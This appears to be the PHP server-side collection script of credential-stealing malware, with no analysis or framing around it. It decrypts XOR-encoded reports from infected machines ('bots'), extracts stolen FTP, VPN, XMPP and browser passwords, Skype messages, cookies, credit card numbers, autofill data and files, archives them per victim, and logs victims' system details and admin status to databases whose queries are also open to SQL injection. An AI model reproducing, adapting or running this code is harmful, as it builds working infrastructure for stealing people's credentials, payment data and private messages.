<?php
include('global.php');
include('geoiploc.php');
$ftp_start = 'FTP: ';
$ftp_end = ' _FTP_';
$jabber_start = 'XMPP: ';
$jabber_end = ' _XMPP_';
$vpn_start = 'VPN: ';
$vpn_end = ' _VPN_';
$pwd_start = 'PWD: ';
$pwd_end = ' _PWD_';
$skype_msg_start = 'SKYPE: ';
$skype_msg_end = ' _SKYPE_';
$cred_start = 'CRED_DATA: ';
$cred_end = ' _CRED_DATA_';
$cookie_start = 'COOOOKIE: ';
$cookie_end = ' _COOOOKIE_';
$cc_start = 'CREDIT_CARD: ';
$cc_end = ' _CREDIT_CARD_';
$autofill_start = 'AUTOFILL_DATA: ';
$autofill_end = ' _AUTOFILL_DATA_';
$sysinfo_start = 'SYSINFORMATION: ';
$sysinfo_end = ' _SYSINFORMATION_';

function XORCipher($data, $key) {
	$dataLen = strlen($data);
	$keyLen = strlen($key);
	$output = $data;

	for ($i = 0; $i < $dataLen; ++$i) {
		$output[$i] = $data[$i] ^ $key[$i % $keyLen];
	}

	return $output;
}

$report = XORCipher(file_get_contents('php://input'), $encryption_key);

$x64 = ord($report[0]);
$is_admin = ord($report[1]);
$IL_id = ord($report[2]);
$os_version_id = ord($report[3]);
$countryCode = substr($report, 4, 2);
$guid_start = substr($report, 6);
$guid = trim(substr($guid_start, 0, 50));
$windows_name = '';
$pc_name = '';
$user_name = '';

$report_length = intval($_SERVER['CONTENT_LENGTH']);

function separateData($start, $end)
{
    $ret_str = '';
    foreach(explode($start, $GLOBALS['report']) as $item)
    {
        $res = explode($end, $item);
        if (count($res) == 2)
        {
            $ret_str = $ret_str.$res[0];
            if (substr($ret_str, -2) !== "\r\n") $ret_str .= "\r\n";
        }
    }
    return $ret_str;
}

function processFiles($zipfile)
{
    $file_start = 'FFFILEE: ';
    $file_end = ' _FFFILEE_';

    $ret_array = array();
    foreach(explode($file_start, $GLOBALS['report']) as $item)
    {
        $file_info = explode($file_end, $item);
        if (count($file_info) == 2)
        {
            $file_name = str_replace('\\', '/', strstr($file_info[0], "\r\n", true));
            if ($file_name)
            {
                $file_data = strstr($file_info[0], "\r\n");
                if ($file_data) $zipfile->addFromString($file_name, substr($file_data, 2));
            }
        }
    }
    return $ret_array;
}

function addPasswords($db, $type, $str)
{
    global $guid;
    foreach(explode("\r\n", $str) as $item)
    {
        if ($item)
        {
            $data = explode(' | ', $item);
            if ($data)
            {
                $host = $data[0];
                $login = $data[1];
                $pwd = $data[2];
                $db->exec("INSERT INTO main (GUID, Type, Host, Login, Password) VALUES ('$guid', '$type', '$host', '$login', '$pwd')");
            }
        }
    }
}

$passwords_db = new SQLite3('info/passwords.db');
$passwords_db->exec('BEGIN;');

$zipName = "files/".$countryCode."-".$guid.".zip";
if (file_exists($zipName)) unlink($zipName);
$res_archive = new ZipArchive;
$res_archive->open($zipName, ZipArchive::CREATE);
$ftp_accs = separateData($ftp_start, $ftp_end);
$jabber_accs = separateData($jabber_start, $jabber_end);
$vpn_accs = separateData($vpn_start, $vpn_end);
$passwords = separateData($pwd_start, $pwd_end);
$skype_msgs = separateData($skype_msg_start, $skype_msg_end);
$autofill = separateData($autofill_start, $autofill_end);
$cred_cards = separateData($cc_start, $cc_end);
if ($ftp_accs) $res_archive->addFromString('ftp.txt', $ftp_accs);
if ($jabber_accs) $res_archive->addFromString('jabber.txt', $jabber_accs);
if ($vpn_accs) $res_archive->addFromString('vpn.txt', $vpn_accs);
if ($passwords) $res_archive->addFromString('passwords.txt', $passwords);
if ($skype_msgs) $res_archive->addFromString('skype.txt', $skype_msgs);
if ($cred_data = separateData($cred_start, $cred_end)) $res_archive->addFromString('credentials.txt', $cred_data);
if ($cookies = separateData($cookie_start, $cookie_end)) $res_archive->addFromString('wininetCookies.txt', $cookies);
if ($autofill) $res_archive->addFromString('autofill.txt', $autofill);
if ($cred_cards) $res_archive->addFromString('cc.txt', $cred_cards);
if ($sysinfo = separateData($sysinfo_start, $sysinfo_end))
{
    $windows_name = explode("\r\n", $sysinfo)[0];
    $pc_name = explode('PC: ', $sysinfo)[1];
    $pc_name = explode("\r\n", $pc_name)[0];
    $user_name = explode('User: ', $sysinfo)[1];
    $user_name = explode("\r\n", $user_name)[0];
    $res_archive->addFromString('sysInfo.txt', $sysinfo);
}
processFiles($res_archive);
$res_archive->close();

addPasswords($passwords_db, 'Browser', $passwords);

$bot_ip = getClientIp();
$country = getCountryFromIP($bot_ip, ' NamE ');
$integrity_level = '';
$timestamp = time();
$date = gmdate('d-m-Y', $timestamp);
switch ($IL_id)
{
    case 0: $integrity_level = 'unknown'; break;
    case 1: $integrity_level = 'low'; break;
    case 2: $integrity_level = 'medium'; break;
    case 3: $integrity_level = 'high'; break;
    case 4: $integrity_level = 'system'; break;
    default: break;
}
if ($db = new SQLite3('info/info.db'))
{
    $db->exec("INSERT INTO main (OS_VERSION, OS_NAME, BOT_ID, BOT_IP, X64, IS_ADMIN, INTEGRITY_LEVEL, timestamp, date, country, PC_NAME, USER_NAME)
        VALUES ('$os_version_id', '$windows_name', '$guid', '$bot_ip', '$x64', '$is_admin', '$integrity_level', '$timestamp', '$date', '$country',
                '$pc_name', '$user_name')");
    $db->close();
}
$passwords_db->exec('COMMIT;');
$passwords_db->close();
echo "OK";
//print_r($report_data);
?>